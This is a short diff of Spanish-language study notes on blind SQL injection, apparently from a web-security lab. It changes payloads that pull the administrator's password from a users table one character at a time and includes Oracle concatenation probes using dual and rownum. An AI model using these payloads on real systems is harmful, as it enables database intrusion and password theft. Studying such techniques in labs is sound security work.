@@ -102,9 +102,9 @@ iteraria sobre los cambpos (select substring(password,*,1) y where username='adm
 
 
 ```
-'and (select substring(password,2,1) from users where username='administrator')='a'--
+'and (select substr(password,2,1) from users where username='administrator')='a'--
 
-'and (select substring(password,2,1) from users where username='administrator')='$a$'--
+'and (select substr(password,2,1) from users where username='administrator')='$a$'--
 ```
 
 
@@ -140,6 +140,7 @@ tipo Oracle que tienes que especificar de donde quieres sacar datos probamos...
 ```
 '||(select '' from dual) ||'
 ' || (select '' from users where rownum=1' ||'
+
 ```
 # ¿Que ES ROWNUM y ROW_NUMBER() vs ROWNUM
 
